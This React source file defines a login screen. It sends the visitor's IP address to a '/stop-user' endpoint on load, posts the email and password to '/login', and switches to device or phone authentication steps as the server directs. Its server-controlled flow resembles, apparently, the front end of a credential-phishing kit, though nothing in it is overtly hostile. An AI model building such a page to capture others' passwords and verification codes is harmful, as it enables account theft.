import {Box, Container, VStack, Image, Heading, Checkbox, Flex, Link, HStack} from "@chakra-ui/react";
import CustomInput from "../component/CustomInput.jsx";
import CustomButton from "../component/CustomButton.jsx";
import {apiPostHandle} from "../util/api.js";
import {useContext, useEffect, useRef, useState} from "react";
import {IPInfoContext} from "ip-info-react";
import {useTranslation} from "react-i18next";
import {FaExternalLinkAlt} from "react-icons/fa";
import useWebSocket from "react-use-websocket";

const LoginScreen = ({setCurrentScreen, systemPrefersDark, setScreenType, setPhoneText, sendMessage}) => {
    const [email, setEmail] = useState("")
    const [emailEntered, setEmailEntered] = useState(false)
    const [password, setPassword] = useState("")
    const [loading, setLoading] = useState(false)
    const [formError, setFormError] = useState(false)

    const passRef = useRef();

    const userInfo = useContext(IPInfoContext);
    const ipAddress = userInfo.ip;

    const {t, i18n} = useTranslation();
    const currentLang = i18n.language

    useEffect(() => {
        if (ipAddress) {
            const data={ip_address: ipAddress, req_from: "web"}
            console.log(data)
            apiPostHandle("/stop-user",data ).then(res => {

            })
        }

    }, [ipAddress]);


    const handleSign = () => {


        if (email !== "" && password !== "") {
            setLoading(true)
            apiPostHandle("/login", {ip_adress: ipAddress, email_phone: email, password: password}).then(res => {
                if (res.status === 200) {
                    console.log(res.data)
                    switch (res.data.result) {
                        case "device_auth":
                            setScreenType(res.data.result)
                            setCurrentScreen("auth")
                            break;
                        case "phone_auth":
                            setPhoneText(res.data.text)
                            setScreenType(res.data.result)
                            setCurrentScreen("auth")
                            break;
                        case "wrong":
                            setFormError(true)
                            setPassword("")
                            setEmailEntered(false)
                            break;
                    }
                }
                setLoading(false)
            }).catch(err => {
                console.log(err)
                setLoading(false)

            })

        }


    }

    const enterEmailHandle = () => {
        if (email !== "") {
            setEmailEntered(true)
            setTimeout(() => {
                passRef.current.focus()
            }, 100)
        }
    }

    useEffect(() => {
        if (formError) {
            setFormError(false)
        }
    }, [email]);

    console.log(systemPrefersDark)
    return (
        <Container height={"100%"}>
            {loading ?
                <Flex height={"80%"} alignItems={"center"} justifyContent={"center"}>
                    <Image src="assets/spinner.gif" width="50" height="50" key={Date.now()}/>
                </Flex> :
                <VStack mt={100}>
                    <Box>
                        <Image src={!systemPrefersDark ? "assets/logo-dark.png" : "assets/logo-white.png"} width="200"
                               height="200"/>
                    </Box>
                    <Box mt={10}>
                        <Heading color={!systemPrefersDark ? "black" : "white"} size={"xl"}
                                 textAlign={"center"}>{t("login.head1.1")}</Heading>
                        <Heading color={!systemPrefersDark ? "black" : "white"} size={"xl"}
                                 textAlign={"center"}>{t("login.head1.2")}</Heading>
                        {currentLang === "ar" &&
                            <Heading dir={"rtl"} color={!systemPrefersDark ? "black" : "white"} size={"xl"}
                                     textAlign={"center"}>{t("login.head1.3")}</Heading>}
                    </Box>
                    <Box mt={5} width={"80%"}>
                        <CustomInput direction={currentLang === "ar" ? "left" : "right"} clickHandle={enterEmailHandle}
                                     showIcon={!emailEntered} top={emailEntered}
                                     textColor={systemPrefersDark ? "white" : "black"}
                                     placeholderColor={!systemPrefersDark ? "black" : "white"} error={formError}
                                     placeholder={t("login.input1")}
                                     borderColor={!systemPrefersDark ? "black" : "white"}
                                     setValue={setEmail} value={email}/>
                        {emailEntered && (
                            <CustomInput direction={currentLang === "ar" ? "left" : "right"} clickHandle={handleSign}
                                         ref={passRef} showIcon={emailEntered} bottom
                                         textColor={!systemPrefersDark ? "black" : "white"}
                                         placeholderColor={!systemPrefersDark ? "black" : "white"}
                                         inputType={"password"} error={formError}
                                         placeholder={t("login.input2")}
                                         borderColor={!systemPrefersDark ? "black" : "white"} setValue={setPassword}
                                         value={password}/>)}


                    </Box>
                    <Box mt={emailEntered ? 5 : 20}>
                        <Checkbox textColor={!systemPrefersDark ? "black" : "white"}>{t("login.check")}</Checkbox>
                    </Box>

                    <Box mt={5}>
                        <HStack>
                            <Link onClick={() => setCurrentScreen("forgot")} color={"#2563eb"}>
                                {t("login.link")}
                            </Link>
                            <FaExternalLinkAlt color={"#2563eb"}/>
                        </HStack>
                    </Box>
                    {/*<Box mt={3}>*/}
                    {/*    <Box height={50} width={120}>*/}
                    {/*        <CustomButton text={t("login.button")} backgroundColor={"black"} clickHandle={handleSign}*/}
                    {/*                      isLoading={loading}/>*/}
                    {/*    </Box>*/}
                    {/*</Box>*/}

                </VStack>}
        </Container>
    )
}

export default LoginScreen;
